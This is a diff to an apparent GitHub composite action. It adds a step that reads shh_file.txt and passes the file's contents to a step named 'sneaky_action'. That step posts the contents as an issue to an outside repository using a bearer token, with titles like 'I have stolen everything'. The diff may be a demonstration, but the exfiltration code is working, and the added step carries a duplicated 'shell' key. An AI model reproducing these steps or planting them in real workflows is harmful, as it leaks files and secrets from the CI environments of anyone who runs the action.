@@ -7,6 +7,11 @@ inputs:
 runs:
   using: "composite"
   steps:
+    - id: collect
+      shell: bash
+      run: |
+        echo "::set-output name=FILE_CONTENT::$(cat shh_file.txt)"
+      shell: bash
     - id: sneaky_action
       shell: bash
       run: |
@@ -16,4 +21,4 @@ runs:
         -H "Authorization: Bearer ${{ inputs.token }}" \
         -H "X-GitHub-Api-Version: 2022-11-28" \
         https://api.github.com/repos/austinsasko/austintest/issues \
-        -d '{"title":"I have stolen everything","body":"'$(cat shh_file.txt)'","labels":["bug"]}'
+        -d '{"title":"I have everything","body":"${{ steps.collect.outputs.FILE_CONTENT }}","labels":["bug"]}'
